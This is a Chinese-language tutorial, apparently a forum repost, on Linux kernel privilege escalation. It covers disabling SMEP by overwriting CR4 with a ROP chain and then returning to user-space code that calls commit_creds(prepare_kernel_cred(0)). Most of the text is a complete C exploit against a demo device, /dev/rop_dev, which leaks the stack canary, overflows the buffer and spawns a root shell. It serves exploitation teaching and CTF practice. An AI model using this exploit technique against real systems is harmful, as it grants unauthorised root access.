# linux 内核提权总结(demo+exp分析) -- ROP(二)


[发表于看雪论坛](https://bbs.pediy.com/user-839858.htm)

## ret2usr CR4篇

+ smep: smep是内核的一种保护措施, 使得内核不可执行用户态代码  

    + 内核通过CR4寄存器的第20位来控制smep, 第20位为0时，smep被关闭 

+ 攻击流程
    1. 提前在用户态代码中构造进程提权代码(get_root)
    2. ROP技术修改CR4第20位数据为0(关闭smep), 通常使用 mov cr4, 0x6f0
    3. 修改 rip 直接指向用户态提权代码,实现进程提权

### 一. 判断是否开启smep
1.  查看 boot.sh
    ``` sh
    qemu-system-x86_64 \
    -kernel bzImage \
    -initrd rootfs.img \
    -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" \
    -cpu qemu64,+smep,+smap \
    -nographic \
    -gdb tcp::1234

    ```
2. smep, smap 在boot.sh -cpu选项内进行设置

### 二. ROP链构造

``` c
    ROP[i++] = 0xffffffff810275f1 + offset; //pop rax; ret
    ROP[i++] = 0x6f0;
    ROP[i++] = 0xffffffff8123ed93 + offset; //pop rcx; ret
    ROP[i++] = 0;
    ROP[i++] = 0xffffffff81003c0e + offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret
    ROP[i++] = 0;
    ROP[i++] = (size_t)get_root;
```

### 三. exp  
``` c
// gcc ret2usr.c -masm=intel -static -o ret2usr

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

size_t base, commit_creds, prepare_kernel_cred;
size_t user_cs, user_ss, user_rflags, user_sp, shell;

void get_shell()
{
    if (!getuid())
    {
        puts("=.=");
        system("/bin/sh");
    }
    else
    {
        puts("failed");
    }
    exit(0);
}

void get_root()
{
    char *(*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char *) = commit_creds;
    (*cc)((*pkc)(0));
    asm(    
        "pushq user_ss;"
        "pushq user_sp;"
        "pushq user_rflags;"
        "pushq user_cs;"
        "push shell;"
        "swapgs;"
        "iretq;");
}

void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    shell = (size_t)get_shell;
    printf("ip is 0x%lx\n", (size_t)get_shell);
    printf("cs is 0x%lx\n", user_cs);
    printf("ss is 0x%lx\n", user_ss);
    printf("sp is 0x%lx\n", user_sp);
    printf("flag is 0x%lx\n", user_rflags);
    puts("status has been saved.");
}

size_t get_addr(char *name)
{
    int num = strlen(name) * 2 + 3 + 27;
    char cmd[num];
    memset(cmd, 0, num);
    strcat(cmd, "cat /tmp/kallsyms | grep ");
    strcat(cmd, name);
    strcat(cmd, " > ");
    strcat(cmd, name);
    printf("the cmd is %s\n", cmd);
    system(cmd);

    char buf[19] = {0};
    size_t addr = 0;

    FILE *fp = fopen(name, "r");
    if (fp == NULL)
    {
        printf("open %s error!\n", name);
        exit(0);
    }
    fgets(buf, 18, fp);
    addr = strtoul(buf, 0, 16);
    printf("the addr(0x) is: %p\n", (void *)addr);
    if (addr == 0)
    {
        puts("string conversion integer failed");
    }
    fclose(fp);
    return addr;
}

size_t get_canary()
{
    system("dmesg | grep canary > canary");
    puts("the cmd is: dmesg | grep canary > canary");
    FILE *fp = fopen("canary", "r");
    if (fp == NULL)
    {
        puts("open canary error");
        exit(0);
    }
    char buf[100] = {0};
    size_t canary = 0;
    fgets(buf, 100, fp);
    char *str_canary = strstr(buf, "0x");
    canary = strtoul(str_canary, 0, 16);
    fclose(fp);
    printf("the canary is 0x%lx\n", canary);

    return canary;
}

char *rop(size_t offset, size_t *ROP)
{
    int i = 0;
    ROP[i++] = 0xffffffff810275f1 + offset; //pop rax; ret
    ROP[i++] = 0x6f0;
    ROP[i++] = 0xffffffff8123ed93 + offset; //pop rcx; ret
    ROP[i++] = 0;
    ROP[i++] = 0xffffffff81003c0e + offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret
    ROP[i++] = 0;
    ROP[i++] = (size_t)get_root;
}

int main()
{
    base = get_addr("startup_64");
    commit_creds = get_addr("commit_creds");
    prepare_kernel_cred = get_addr("prepare_kernel_cred");
    size_t offset = base - 0xffffffff81000000;
    printf("offset is: %lx\n", offset);

    int fd = open("/dev/rop_dev", 2);
    if (0 == fd)
    {
        puts("open /dev/rop_dev error");
        exit(0);
    }
    char payload1[0x10] = {0};
    write(fd, payload1, 0x10);
    write(fd, payload1, 0x10);
    size_t canary = get_canary();

    size_t payload2[19] = {0};
    payload2[0] = 0x6161616161616161;
    payload2[1] = 0x6262626262626262;
    payload2[2] = canary;
    payload2[3] = 0x6363636363636363;
    save_status();
    rop(offset, &payload2[4]);
    write(fd, payload2, 8 * 19);

    return 0;
}
```


